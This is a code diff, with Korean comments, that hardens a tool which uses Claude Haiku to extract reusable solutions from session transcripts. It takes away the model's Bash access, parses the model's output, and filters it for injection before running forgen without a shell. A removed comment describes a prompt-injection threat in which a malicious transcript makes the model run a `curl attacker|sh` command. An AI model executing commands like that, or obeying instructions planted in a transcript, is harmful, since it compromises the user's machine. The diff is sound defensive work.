@@ -375,14 +375,22 @@ try {
     }
   } catch { /* ignore */ }
 
+  // 결함2 corrected fix (2026-08-19): 이전엔 모델에게 `Bash(forgen compound:*)` 도구를 주고
+  // forgen compound 를 "직접 실행"시켰으나, headless haiku 는 도구 호출이 근본적으로
+  // 불안정해(라이브 확증: 동일 조건에서 실행/미실행 1↔0 오락가락) 산출이 forgen 생애
+  // 통틀어 0건이었다. 이제 behavior 경로와 동일하게 — 모델은 재사용 솔루션을 텍스트로만
+  // 출력하고(안정적), 러너가 파싱해 forgen 을 직접 실행한다.
+  //   이점: (a) 모델에 Bash 도구를 아예 주지 않으므로 P1-S1 인젝션 표면 제거 — 모델 출력은
+  //   파싱·필터를 거쳐 execFileSync 의 *인자*로만 쓰이고 셸을 거치지 않아 임의 명령 실행 불가.
+  //   (b) 도구 호출 신뢰성 문제 제거. (c) forgen 을 이 러너 node 의 형제 바이너리(절대경로)로
+  //   호출해 cron sparse PATH 에 forgen 이 없던 문제(라이브 확증)도 해소.
   const solutionPrompt = `다음은 이전 Claude Code 세션의 대화 요약입니다.
-미래 세션에서 재사용할 수 있는 패턴, 해결책, 의사결정을 추출해주세요.
+미래 세션에서 재사용할 수 있는 패턴/해결책/의사결정을 추출해주세요.
+각 항목을 정확히 아래 한 줄 형식으로만 출력하세요 (다른 설명 없이, 코드블록도 불필요):
+forgen compound --solution "제목" "설명 (무엇 + 왜 + 어떻게 적용)"
 
-각 항목은 반드시 다음을 포함해야 합니다:
-- **제목**: 구체적이고 검색 가능한 이름 (예: "vitest-mock-esm-pattern", "react-state-lifting-decision")
-- **설명**: (1) 무엇을 했는지 (2) 왜 그렇게 했는지 (3) 어떻게 적용하는지
-
-형식: forgen compound --solution "제목" "설명 (why + how to apply)"
+- 제목: 구체적이고 검색 가능한 이름 (예: "react-high-frequency-event-raf-throttle")
+- 설명: (1) 무엇을 했는지 (2) 왜 그렇게 했는지 (3) 어떻게 적용하는지
 추출할 것이 없으면 "추출할 패턴 없음"이라고만 답하세요.
 최대 3개. 피상적인 관찰(예: "TypeScript를 사용함")은 제외. 기존 솔루션과 중복 금지.${existingList}
 
@@ -390,36 +398,53 @@ try {
 ${sanitizedSummary.slice(0, 6000)}
 ---`;
 
-  // P1-S1 fix (2026-04-20): 과거에는 `--allowedTools Bash`로 전체 Bash 권한을 줘서
-  // 악성 transcript(공급망 인젝션)가 filter를 우회해 `curl attacker|sh` 같은 명령을
-  // 피해자 권한으로 실행시킬 수 있었다. 이제 `Bash(forgen compound:*)`로 좁혀 Claude
-  // 가 compound 추출용 forgen CLI 호출만 가능하게 한다. filter-bypass 시에도 임의
-  // 명령 실행 차단.
-  //
-  // 결함2 fix (2026-08-18): sparse env(cron/비로그인 셸 — 이 러너 자체가 항상
-  // detached·headless 로 실행되는 환경)에서 위 스코프만으로는 haiku 가 "승인이
-  // 필요하다"고 오판해 forgen compound 를 실제 실행하지 않고 산문으로 응답 →
-  // 결과적으로 extraction 이 항상 0건이었다(RCA: sparse 3/3 실패, interactive
-  // 4/4 성공 — PATH 문제 아님). `--permission-mode dontAsk` 는 승인 프롬프트를
-  // 아예 띄우지 않고 "사전 승인(allowedTools)되지 않은 건 그냥 거부"하는 모드다
-  // (`bypassPermissions`와 달리 `--dangerously-skip-permissions` 를 요구하지 않고,
-  // 전체 권한검사를 끄지도 않는다 — 위 `Bash(forgen compound:*)` 밖의 어떤 명령도
-  // 여전히 거부됨). 이미 `autoCompoundHaiku` opt-in 동의로 이 경로 전체가
-  // 게이트되어 있고, 그 안에서도 forgen-compound 커맨드 스코프로만 자동 실행을
-  // 허용하는 것이므로 안전 — 이 스코프를 절대 넓히지 말 것(전체 Bash 나
-  // `--dangerously-skip-permissions`/`bypassPermissions` 로 교체 금지).
+  let solutionOutput = '';
   try {
-    extractViaHaiku(
-      [
-        '-p', solutionPrompt,
-        '--allowedTools', 'Bash(forgen compound:*)',
-        '--permission-mode', 'dontAsk',
-        '--model', COMPOUND_MODEL,
-      ],
-      { cwd, timeout: 90_000, stdio: ['pipe', 'ignore', 'pipe'] },
-    );
+    solutionOutput = extractViaHaiku(
+      ['-p', solutionPrompt, '--model', COMPOUND_MODEL],
+      { cwd, timeout: 90_000, encoding: 'utf-8' },
+    ) || '';
   } catch (e) {
     process.stderr.write(`[forgen-auto-compound] solution extraction: ${e instanceof Error ? e.message : String(e)}\n`);
+  }
+
+  // 모델 출력에서 `--solution "제목" "설명"` 을 파싱해 forgen 을 직접 실행(결정론적).
+  // forgen 은 이 러너를 돌리는 node 의 형제 바이너리를 절대경로로 호출 — sparse PATH 의존 제거.
+  const nodeBinDir = path.dirname(process.execPath);
+  const forgenBin = fs.existsSync(path.join(nodeBinDir, 'forgen'))
+    ? path.join(nodeBinDir, 'forgen')
+    : 'forgen';
+  const solutionArgRe = /--solution\s+"((?:[^"\\]|\\.)+)"\s+"((?:[^"\\]|\\.)+)"/g;
+  let match: RegExpExecArray | null;
+  let extractedCount = 0;
+  // biome-ignore lint/suspicious/noAssignInExpressions: regex exec 루프 관용구
+  while ((match = solutionArgRe.exec(solutionOutput)) !== null && extractedCount < 3) {
+    const title = match[1].replace(/\\"/g, '"').trim();
+    const rawContent = match[2].replace(/\\"/g, '"').trim();
+    if (!title || rawContent.length < 20) continue;
+    // 모델 출력은 untrusted transcript 파생 — 저장 전 injection/exfil 필터(defense in depth).
+    if (containsPromptInjection(`${title} ${rawContent}`)) {
+      process.stderr.write('[forgen-auto-compound] solution: injection detected in LLM output, skipping\n');
+      continue;
+    }
+    const contentScan = filterSolutionContent(rawContent);
+    if (contentScan.verdict === 'block') {
+      process.stderr.write('[forgen-auto-compound] solution: content blocked by filter, skipping\n');
+      continue;
+    }
+    try {
+      // title/content 는 execFileSync 의 *인자*로만 전달 — 셸 미경유라 메타문자가 있어도
+      // 명령 인젝션 불가. FORGEN_HOME 등 env 는 그대로 상속되어 올바른 스토어에 기록된다.
+      execFileSync(forgenBin, ['compound', '--solution', title, contentScan.sanitized], {
+        cwd,
+        timeout: 20_000,
+        stdio: ['ignore', 'ignore', 'pipe'],
+        env: { ...process.env, PATH: `${nodeBinDir}${path.delimiter}${process.env.PATH ?? ''}` },
+      });
+      extractedCount++;
+    } catch (e) {
+      process.stderr.write(`[forgen-auto-compound] solution write: ${e instanceof Error ? e.message : String(e)}\n`);
+    }
   }
 
   // Post-extraction quality validation: remove files that fail lightweight gates
